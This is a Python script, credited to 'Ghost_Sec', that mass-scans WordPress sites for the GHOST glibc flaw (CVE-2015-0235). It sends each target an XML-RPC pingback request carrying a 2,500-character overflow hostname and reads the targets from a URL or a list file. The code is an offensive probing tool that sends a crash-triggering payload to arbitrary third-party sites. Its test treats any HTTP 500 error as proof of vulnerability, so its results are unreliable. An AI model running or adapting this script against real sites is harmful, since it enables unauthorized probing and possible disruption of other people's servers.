import requests
import argparse
import time
import warnings
from colorama import Fore, Style, init

init(autoreset=True)

print(f"""{Fore.BLUE}{Style.BRIGHT}
  ____ _               _     ____                                  
 / ___| |__   ___  ___| |_  / ___|  ___ __ _ _ __  _ __   ___ _ __ 
| |  _| '_ \ / _ \/ __| __| \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
| |_| | | | | (_) \__ \ |_   ___) | (_| (_| | | | | | | |  __/ |   
 \____|_| |_|\___/|___/\__| |____/ \___\__,_|_| |_|_| |_|\___|_|   
  CVE-2015-0235 || WordPress XMLRPC Interface [By. Ghost_Sec]{Style.RESET_ALL}
""")

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

class WordPressGHOSTScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')

    def is_wordpress(self):
        try:
            response = requests.get(f"{self.target_url}/wp-json/", timeout=5)
            return response.status_code == 200
        except requests.RequestException:
            return False

    def check_vulnerability(self):
        ghost_payload = "0" * 2500
        payload = f"http://{ghost_payload}/test.php"
        xml_rpc = f"""<?xml version="1.0"?>
        <methodCall>
            <methodName>pingback.ping</methodName>
            <params>
                <param><string>{payload}</string></param>
                <param><string>{payload}</string></param>
            </params>
        </methodCall>"""

        try:
            response = requests.post(f"{self.target_url}/xmlrpc.php", data=xml_rpc, headers={'Content-Type': 'text/xml'}, timeout=5)
            return response.status_code == 500  
        except requests.RequestException:
            return False  

    def run_scan(self):
        print(Fore.GREEN + Style.BRIGHT + f"🔍 Scanning: {self.target_url}")
        if not self.is_wordpress():
            print(Fore.RED + Style.BRIGHT + f"❎ {self.target_url} is not a WordPress site.")
            return

        if self.check_vulnerability():
            print(Fore.RED + Style.BRIGHT + f"✅ {self.target_url} is vulnerable to GHOST.")
        else:
            print(Fore.GREEN + Style.BRIGHT + f"❎ {self.target_url} is not vulnerable to GHOST.")

def main():
    parser = argparse.ArgumentParser(description='Scan WordPress sites for GHOST vulnerability.')
    parser.add_argument('-u', '--url', help='Target site for single scan.')
    parser.add_argument('-f', '--file', help='File containing target URLs, one per line.')
    args = parser.parse_args()
    
    targets = []

    if args.url:
        targets.append(args.url)
    if args.file:
        with open(args.file, 'r') as f:
            targets.extend([line.strip() for line in f if line.strip()])

    if not targets:
        print(Fore.RED + Style.BRIGHT + "No targets provided.")
        return

    print(Fore.RED + Style.BRIGHT + "\n=== WordPress XMLRPC GHOST Vulnerability Scanner ===\n")
    for target in targets:
        scanner = WordPressGHOSTScanner(target)
        scanner.run_scan()
        time.sleep(1)
    print(Fore.CYAN + Style.BRIGHT + "\n=== Scanning Complete ===")

if __name__ == "__main__":
    main()
